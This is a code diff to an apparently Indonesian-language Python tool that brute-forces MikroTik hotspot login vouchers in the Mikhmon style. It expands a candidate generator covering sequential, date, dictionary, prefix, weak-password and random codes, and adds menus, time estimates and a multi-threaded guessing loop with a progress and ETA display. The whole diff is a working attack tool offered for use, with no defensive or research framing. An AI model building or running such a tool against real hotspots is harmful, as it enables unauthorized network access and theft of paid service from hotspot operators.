@@ -373,72 +373,242 @@ def compute_md5(challenge, password, mode):
         return hashlib.md5(b"\x00" + password.encode()).hexdigest()
 
 
-# ── 5. GENERATE CANDIDATES ──
+# ── 5. GENERATE CANDIDATES (Mikhmon-style patterns) ──
 
-def gen_candidates():
-    c = []
+MIKHMON_PREFIXES = [
+    "VOC", "MNT", "VIP", "HS", "HOT", "WIFI", "NET", "TEST",
+    "DEMO", "FREE", "TRIAL", "GUEST", "TAMU", "USER", "ADMIN",
+]
 
-    # Sequential
-    for i in range(1000, 3000):
-        c.append(str(i))
-    for i in range(10000, 11000):
-        c.append(str(i))
+def gen_candidates(length, charset_mode, pattern_mode):
+    """Generate voucher candidates based on Mikhmon patterns.
+    
+    length: 4, 6, 8, 10, 12
+    charset_mode: 'numeric', 'alphanum_upper', 'alphanum_mixed'
+    pattern_mode: 'sequential', 'date', 'dict', 'mikhmon', 'all'
+    """
+    candidates = []
 
-    # Date
+    # ── Character sets ──
+    if charset_mode == "numeric":
+        chars = string.digits
+    elif charset_mode == "alphanum_upper":
+        chars = string.digits + string.ascii_uppercase
+    elif charset_mode == "alphanum_mixed":
+        chars = string.digits + string.ascii_letters
+    else:
+        chars = string.digits
+
     now = time.localtime()
     y, mo, d = now.tm_year, now.tm_mon, now.tm_mday
-    for variant in [
-        f"{y}{mo:02d}{d:02d}", f"{d:02d}{mo:02d}{y}",
-        f"{y%100:02d}{mo:02d}{d:02d}", f"{d:02d}{mo:02d}{y%100:02d}",
-        f"{y}{mo:02d}", f"{mo:02d}{y%100:02d}",
-        f"{mo:02d}{d:02d}", f"{d:02d}{mo:02d}",
-    ]:
-        c.append(variant)
 
-    # Dictionary
-    words = [
-        "wifi", "hotspot", "internet", "free", "net", "wlan", "admin",
-        "guest", "tamu", "user", "test", "demo", "trial", "voucher",
-        "cepat", "murah", "malam", "pagi", "bulan", "paket", "minggu",
-        "harian", "jam", "1jam", "2jam", "3jam", "1hari", "7hari",
-        "30hari", "1bulan", "unlimited", "123456", "12345678",
+    def add(c):
+        if c and len(str(c)) >= 1:
+            candidates.append(str(c))
+
+    # ── PATTERN 1: Sequential ──
+    if pattern_mode in ("sequential", "all"):
+        if length <= 6:
+            start, end = 1000, 10000
+        elif length == 8:
+            start, end = 10000000, 10010000   # 10000 range
+        elif length == 10:
+            start, end = 1000000000, 1000001000
+        else:
+            start, end = 1000, 5000
+
+        for i in range(start, end):
+            if len(str(i)) <= length:
+                add(str(i).zfill(length))
+
+    # ── PATTERN 2: Date-based ──
+    if pattern_mode in ("date", "all"):
+        date_formats = []
+        if length == 8:
+            date_formats = [
+                f"{y}{mo:02d}{d:02d}", f"{d:02d}{mo:02d}{y}",
+                f"{y%100:02d}{mo:02d}{d:02d}", f"{d:02d}{mo:02d}{y%100:02d}",
+            ]
+        elif length == 6:
+            date_formats = [
+                f"{y%100:02d}{mo:02d}{d:02d}", f"{d:02d}{mo:02d}{y%100:02d}",
+            ]
+        elif length == 4:
+            date_formats = [f"{mo:02d}{d:02d}", f"{d:02d}{mo:02d}"]
+
+        # Also try last 30 days
+        import datetime
+        for day_offset in range(30):
+            dt = datetime.datetime.now() - datetime.timedelta(days=day_offset)
+            if length == 8:
+                date_formats.append(f"{dt.year}{dt.month:02d}{dt.day:02d}")
+                date_formats.append(f"{dt.day:02d}{dt.month:02d}{dt.year}")
+            elif length == 6:
+                date_formats.append(f"{dt.year%100:02d}{dt.month:02d}{dt.day:02d}")
+
+        for df in date_formats:
+            if len(df) == length:
+                add(df)
+
+    # ── PATTERN 3: Dictionary words ──
+    if pattern_mode in ("dict", "all"):
+        words = [
+            "wifi", "hotspot", "internet", "free", "net", "wlan",
+            "admin", "guest", "tamu", "user", "test", "demo", "trial",
+            "voucher", "cepat", "murah", "malam", "pagi", "bulan", "paket",
+            "minggu", "harian", "jam", "1jam", "2jam", "3jam",
+            "1hari", "7hari", "30hari", "1bulan", "unlimited",
+        ]
+        for w in words:
+            # Word alone (if matches length)
+            if len(w) == length:
+                add(w)
+            # Word + pad
+            remainder = length - len(w)
+            if remainder > 0:
+                for pad in ["", "123", "1234", "1", "0", "00", "000"]:
+                    if len(pad) == remainder:
+                        add(w + pad)
+                        add(w.upper() + pad)
+            # Pad + word
+            if length >= len(w) + 3:
+                add("123" + w)
+
+    # ── PATTERN 4: Mikhmon-style prefixes ──
+    if pattern_mode in ("mikhmon", "all"):
+        pad_len = length - 3  # after 3-char prefix
+        if pad_len >= 2:
+            for prefix in MIKHMON_PREFIXES:
+                # Sequential after prefix
+                for seq in range(0, 5000 if pad_len <= 4 else 1000):
+                    add(prefix + str(seq).zfill(pad_len))
+
+                # Common suffixes
+                for suffix in ["123", "001", "0001", "999", "100"]:
+                    padded = suffix.zfill(pad_len)
+                    if len(padded) == pad_len:
+                        add(prefix + padded)
+
+    # ── PATTERN 5: Common weak patterns ──
+    weak = [
+        "1234", "12345", "123456", "12345678", "1234567890", "123456789012",
+        "0000", "00000", "000000", "00000000",
+        "1111", "11111", "111111", "2222", "222222",
+        "3333", "4444", "5555", "6666", "7777", "8888", "9999",
+        "password", "admin", "guest", "qwerty",
     ]
-    for w in words:
-        c.append(w)
-        c.append(w + "123")
-        c.append(w + "1234")
-        c.append(w + "1")
-        c.append("123" + w)
-        c.append(w.upper())
+    for w in weak:
+        if len(w) == length:
+            add(w)
 
-    # Random alphanumeric
-    for _ in range(1000):
-        length = random.choice([6, 8, 10])
-        chars = string.digits + string.ascii_uppercase
-        c.append("".join(random.choice(chars) for _ in range(length)))
+    # ── PATTERN 6: Random sampling ──
+    sample_count = min(5000, len(chars) ** min(length, 3))
+    for _ in range(sample_count):
+        candidate = "".join(random.choice(chars) for _ in range(length))
+        add(candidate)
 
-    # Common MikroTik vouchers
-    common = [
-        "123", "1234", "12345", "123456", "1234567", "12345678",
-        "0000", "1111", "2222", "3333", "4444", "5555", "6666",
-        "7777", "8888", "9999", "000000", "111111", "999999",
-        "admin", "password", "pass", "qwerty", "abc123",
-        "letmein", "welcome", "master", "changeme",
-    ]
-    c.extend(common)
-
-    return list(dict.fromkeys(c))
+    # Deduplicate
+    candidates = list(dict.fromkeys(candidates))
+    return candidates
 
 
 # ── 6. BRUTE FORCE ──
 
 def brute_force(session):
-    print(f"{B}  ─── STARTING BRUTE FORCE ───{Z}")
+    print(f"{B}  ─── BRUTE FORCE CONFIG ───{Z}")
     print(f"  Auth mode: {Y}{session['auth_mode'].upper()}{Z}")
+    print()
 
-    candidates = gen_candidates()
-    info(f"Generated {len(candidates)} voucher candidates")
-    info(f"Starting multi-thread brute force...")
+    # ── Menu charset ──
+    print(f"  {B}Charset (set karakter):{Z}")
+    print(f"  {Y}1{R}) Numeric (0-9)")
+    print(f"  {Y}2{R}) Alphanumeric UPPERCASE (A-Z + 0-9)")
+    print(f"  {Y}3{R}) Alphanumeric mixed (A-Z, a-z, 0-9)")
+    print(f"  {Y}4{R}) Custom")
+
+    charset_mode = "numeric"
+    try:
+        ch = input(f"  {G}Pilih [1-4] (default: 1): {Z}").strip() or "1"
+        if ch == "1": charset_mode = "numeric"
+        elif ch == "2": charset_mode = "alphanum_upper"
+        elif ch == "3": charset_mode = "alphanum_mixed"
+        elif ch == "4":
+            custom = input(f"  {G}Charset custom (contoh: 0123456789ABCDEF): {Z}").strip()
+            if custom:
+                charset_mode = custom
+    except KeyboardInterrupt:
+        return []
+
+    print()
+
+    # ── Menu length ──
+    print(f"  {B}Panjang kode voucher:{Z}")
+    print(f"  {Y}4{R}) 4 karakter")
+    print(f"  {Y}6{R}) 6 karakter")
+    print(f"  {Y}8{R}) 8 karakter (default Mikhmon)")
+    print(f"  {Y}10{R}) 10 karakter")
+    print(f"  {Y}12{R}) 12 karakter")
+    print(f"  {Y}0{R}) Custom")
+
+    length = 8
+    try:
+        ln = input(f"  {G}Pilih [4/6/8/10/12/0] (default: 8): {Z}").strip() or "8"
+        if ln == "0":
+            length = int(input(f"  {G}Panjang custom: {Z}").strip() or "8")
+        else:
+            length = int(ln)
+    except (ValueError, KeyboardInterrupt):
+        length = 8
+
+    print()
+
+    # ── Menu pattern ──
+    print(f"  {B}Mode pattern (mirip Mikhmon):{Z}")
+    print(f"  {Y}1{R}) Sequential (00000000, 00000001, ...) — KALO ADMIN MALES")
+    print(f"  {Y}2{R}) Date-based (YYYYMMDD, DDMMYYYY)")
+    print(f"  {Y}3{R}) Dictionary (wifi123, hotspot01, ...)")
+    print(f"  {Y}4{R}) Mikhmon prefix (VOC00001, HOT00001, ...)")
+    print(f"  {Y}5{R}) ALL PATTERNS (rekomendasi)")
+    print(f"  {Y}6{R}) SMART AUTO (analisis pola dari halaman login)")
+
+    pattern_mode = "all"
+    try:
+        pm = input(f"  {G}Pilih [1-6] (default: 5 ALL): {Z}").strip() or "5"
+        modes = {"1": "sequential", "2": "date", "3": "dict", "4": "mikhmon", "5": "all", "6": "all"}
+        pattern_mode = modes.get(pm, "all")
+    except KeyboardInterrupt:
+        pattern_mode = "all"
+
+    print()
+
+    # ── Generate candidates ──
+    info("Generating voucher candidates...")
+    candidates = gen_candidates(length, charset_mode, pattern_mode)
+    ok(f"Generated {len(candidates)} candidates")
+
+    # ── Time estimate ──
+    est_speed = 40  # conservative HTTP requests/sec
+    est_seconds = len(candidates) / est_speed
+    if est_seconds < 60:
+        est_str = f"{est_seconds:.0f} detik"
+    elif est_seconds < 3600:
+        est_str = f"{est_seconds/60:.1f} menit"
+    else:
+        est_str = f"{est_seconds/3600:.1f} jam"
+    info(f"Estimasi waktu: ~{est_str} (dengan {est_speed} req/s)")
+    print()
+
+    # ── Confirm ──
+    try:
+        go = input(f"  {Y}[?] Mulai brute force? (ya/tidak): {Z}").strip().lower()
+        if go not in ("ya", "y", "yes"):
+            print(f"\n  {C}[*] Batal.{Z}")
+            return []
+    except KeyboardInterrupt:
+        return []
+
+    print()
+    info(f"Starting multi-thread brute force ({length} chars, {charset_mode})...")
     print(f"  {D}Ctrl+C to stop{Z}\n")
 
     tested = 0
@@ -465,8 +635,12 @@ def brute_force(session):
             with lock:
                 elapsed = max(time.time() - start_time, 0.01)
                 rate = tested / elapsed
-                print(f"\r  {D}[{int(elapsed)}s]{Z} Tested: {tested}/{len(candidates)} | "
-                      f"{rate:.1f}/s | Found: {G}{len(found)}{Z}   ", end="")
+                pct = tested / len(candidates) * 100
+                eta_sec = (len(candidates) - tested) / rate if rate > 0 else 0
+                eta_str = f"{int(eta_sec)}s" if eta_sec < 60 else f"{eta_sec/60:.0f}m"
+
+                print(f"\r  {D}[{int(elapsed)}s]{Z} {tested}/{len(candidates)} ({pct:.0f}%) | "
+                      f"{rate:.0f}/s | Found: {G}{len(found)}{Z} | ETA: {eta_str}   ", end="")
             if stop.is_set():
                 for f in futures:
                     f.cancel()
@@ -479,7 +653,8 @@ def brute_force(session):
             print(f"    {G}{B}{f}{Z}")
         return found
     else:
-        warn("Tidak ada voucher ditemukan.")
+        warn("Tidak ada voucher ditemukan dengan pola ini.")
+        warn("Coba ganti charset, panjang, atau pattern mode.")
         return []
 
 
